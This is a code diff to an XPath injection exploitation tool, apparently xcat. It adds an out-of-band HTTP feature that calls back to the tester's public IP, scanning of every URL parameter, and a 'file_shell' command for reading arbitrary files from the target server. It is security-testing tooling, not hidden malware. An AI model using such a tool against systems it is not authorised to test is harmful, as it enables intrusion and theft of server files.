@@ -7,6 +7,7 @@ import ipgetter
 
 from .lib.requests.injectors import get_all_injectors
 from .lib.executors import xpath1, xpath2, docfunction
+from .lib.features.oob_http import OOBDocFeature
 from .lib.features.doc import DocFeature
 from .lib.features.xpath_2 import XPath2
 from .lib.features.entity_injection import EntityInjection
@@ -31,7 +32,7 @@ colorama.init()
 #@click.option("--error", "detection_method", flag_value="error", help="match_string indicates an error response")
 
 @click.option("--loglevel", type=click.Choice(["debug", "info", "warn", "error"]), default="error")
-@click.option("--logfile", type=click.File("wb"), default="-")
+@click.option("--logfile", type=click.File("w", encoding="utf-8"), default="-")
 
 @click.option("--public-ip", default="autodetect", help="Public IP address to use with OOB connections")
 @click.pass_context
@@ -47,9 +48,6 @@ def xcat(ctx, target, arguments, target_parameter, match_string, method, detecti
     else:
         checker = lambda r, b: not match_string in b
 
-    ctx.obj["detector"] = detector.Detector(target, method, arguments, target_parameter, checker=checker)
-    ctx.obj["target_param"] = target_parameter
-
     if public_ip == "autodetect":
         try:
             public_ip = ipgetter.IPgetter().get_externalip()
@@ -60,7 +58,12 @@ def xcat(ctx, target, arguments, target_parameter, match_string, method, detecti
 
     # Hack Hack Hack:
     # Setup an OOB http server instance on the doc feature class
-    DocFeature.server = OOBHttpServer(host=public_ip)
+    OOBDocFeature.server = OOBHttpServer(host=public_ip)
+    ctx.obj["target_param"] = target_parameter
+    ctx.obj["detector"] = detector.Detector(target, method, arguments,
+                                            target_parameter if target_parameter != "*" else None,
+                                            checker=checker)
+
 
 
 @xcat.group()
@@ -70,6 +73,10 @@ def xcat(ctx, target, arguments, target_parameter, match_string, method, detecti
               default="autodetect", help="XPath version to use")
 @click.pass_context
 def run(ctx, injector, xversion):
+    if ctx.obj["target_param"] == "*":
+        click.echo("Please specify a valid target parameter!")
+        ctx.exit(1)
+
     detector = ctx.obj["detector"]
 
     if injector == "autodetect":
@@ -102,7 +109,7 @@ def run(ctx, injector, xversion):
     elif xversion == "2":
         executor = xpath2.XPath2Executor
 
-    if DocFeature in features:
+    if OOBDocFeature in features:
         executor = docfunction.DocFunctionExecutor
 
     ctx.obj["injector"] = injector
@@ -126,6 +133,15 @@ def retrieve(ctx, query, output, format):
 @run.command(help="Read arbitrary files from the filesystem")
 @click.pass_context
 def file_shell(ctx):
+    requester = ctx.obj["requester"]
+    click.echo("These are the types of files you can read:")
+    if requester.has_feature(EntityInjection):
+        click.echo(" * Arbitrary text files that do not contain XML, or files that do and do not contain '-->'")
+    if requester.has_feature(DocFeature):
+        click.echo(" * Local XML files")
+    if requester.has_feature(OOBDocFeature):
+        click.echo(" * Valid XML files available over the network")
+
     # ToDo: Make this more like a shell, with a current directory etc. Make it more usable :)
     click.echo("There are three ways to read files on the file system using XPath:")
     click.echo(" 1. inject: Can read arbitrary text files as long as they do not contain any XML")
@@ -135,7 +151,10 @@ def file_shell(ctx):
     click.echo("Type uri to read the URI of the document being queried")
     click.echo("Note: The URI should have a protocol, e.g: file:///test.xml. Bad things may happen if the URI does not exist, and it is best to use absolute paths.")
 
-    entity_injection = ctx.obj["requester"].get_feature(EntityInjection)
+    try:
+        entity_injection = ctx.obj["requester"].get_feature(EntityInjection)
+    except Exception:
+        entity_injection = None
 
     commands = {
         "doc": lambda p: run_then_return(display_results(XMLOutput(), ctx.obj["executor"], doc(p).add_path("/*[1]"))),
@@ -185,27 +204,34 @@ def get_uri(ctx):
 def test_injection(ctx):
     detector = ctx.obj["detector"]
 
-    click.echo("Testing parameter {}:".format(ctx.obj["target_param"]))
+    if ctx.obj["target_param"] == "*":
+        params = detector.requests.get_url_parameters()
+    else:
+        params = [ctx.obj["target_param"]]
 
-    injectors = run_then_return(get_injectors(detector, with_features=True))
+    for param in params:
+        click.echo("Testing parameter {}:".format(param))
+        detector = detector.change_parameter(param)
 
-    if len(injectors) == 0:
-        click.echo("Could not inject into parameter. Are you sure it is vulnerable?")
+        injectors = run_then_return(get_injectors(detector, with_features=True))
 
-    for injector, features in injectors.items():
-        injector_example = "{}:\t\t{}".format(injector.__class__.__name__, injector.EXAMPLE)\
-            .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
-        click.echo(injector_example)
+        if len(injectors) == 0:
+            click.echo("Could not inject into parameter. Are you sure it is vulnerable?")
 
-        for feature in features:
-            click.echo("\t- {}".format(feature.__name__))
+        for injector, features in injectors.items():
+            injector_example = "{}:\t\t{}".format(injector.__class__.__name__, injector.example)\
+                .replace("?", colorama.Fore.GREEN + "?" + colorama.Fore.RESET)
+            click.echo(injector_example)
+
+            for feature in features:
+                click.echo("\t- {}".format(feature.__name__))
 
 
 @asyncio.coroutine
 def get_injectors(detector, with_features=False):
     injectors = yield from detector.detect_injectors()
     if not with_features:
-        return {i:[] for i in injectors}
+        return {i: [] for i in injectors}
     # Doesn't work it seems. Shame :(
     #return{injector: (yield from detector.detect_features(injector))
     #        for injector in injectors}
